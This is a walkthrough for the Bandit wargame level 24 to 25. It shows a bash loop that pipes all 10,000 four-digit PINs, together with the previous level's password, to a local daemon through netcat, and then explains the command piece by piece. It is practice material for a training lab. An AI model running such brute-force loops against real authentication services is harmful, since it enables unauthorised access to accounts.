Level Goal:

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

You do not need to create new connections each time

Steps to solve:

step1: use command `for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002`

or you can create a python code and use command `python3 /tmp/[cod.sh](http://code.sh) | nc [localhost](http://localhost) 30002`

Sure! Let's break down this command step by step:

```bash
for i in {0000..9999}; do
    echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i
done | nc localhost 30002

```

### 1. `for i in {0000..9999}; do ... done`

- This is a **Bash `for` loop**.
- `{0000..9999}` generates a sequence of numbers from `0000` to `9999`, **padded with zeros** to 4 digits.
- `i` takes each value in this range, one at a time.
- The code inside `do ... done` is executed for each `i`.

---

### 2. `echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i`

- For each value of `i`, it prints a line to standard output.
- The line consists of:
    - `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8` (some fixed string, likely a token or key)
    - A space
    - The current value of `i` (from `0000` to `9999`)

So, the output will look like:

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0002
...
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9999

```

---

### 3. `| nc localhost 30002`

- The `|` (pipe) takes all the output from the `for` loop and sends it as input to the next command.
- `nc` (Netcat) is a networking tool that can read and write data over TCP or UDP.
- `localhost` means the connection is made to your own computer.
- `30002` is the **port number** on your local machine.

So, this part sends **all 10,000 lines** generated by the loop to the program or service listening on port `30002` on your machine.
